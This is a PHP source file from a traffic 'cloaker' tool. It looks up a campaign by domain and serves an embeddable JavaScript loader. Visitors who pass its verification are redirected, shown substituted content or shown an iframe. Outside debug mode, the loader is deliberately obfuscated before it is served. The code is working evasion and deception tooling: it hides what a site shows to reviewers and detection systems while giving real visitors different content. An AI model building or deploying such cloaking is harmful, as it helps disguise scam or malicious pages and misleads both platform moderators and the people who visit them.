<?php
//This file must be included if you want to connect the cloaker using Javascript.
//This works good for any website builders or GitHub for example.
//Use the following code: <script src="https://your.domain/js/index.php"></script>
//If the user passes the verification, the action you specified for the JS connection in campaign settings
//will be performed: 
//1.redirect 
//2.content substitution 
//3.show iframe
require_once __DIR__.'/obfuscator.php';
require_once __DIR__.'/../db.php';
require_once __DIR__.'/../debug.php';
require_once __DIR__.'/../settings.php';
require_once __DIR__.'/../requestfunc.php';
require_once __DIR__.'/../config/Campaign.php';

$db = new Db();
$dbCamp = $db->get_campaign_by_domain($_SERVER['HTTP_HOST']);
if ($dbCamp===null)
    die("NO CAMPAIGN FOR THIS DOMAIN!");
//TODO create a trafficback campaign option

$c = new Campaign($dbCamp['id'],$dbCamp['settings']);
if ($c->white->jsChecks->enabled) {
    header('Content-Type: text/javascript');
    $jsCode= str_replace('{DOMAIN}', get_cloaker_path(), file_get_contents(__DIR__.'/connect.js'));
    if (DebugMethods::$on){
        echo $jsCode;
    } else {
        $hunter = new HunterObfuscator($jsCode);
        echo $hunter->Obfuscate();
    }
} else {
    include __DIR__.'/process.php';
}
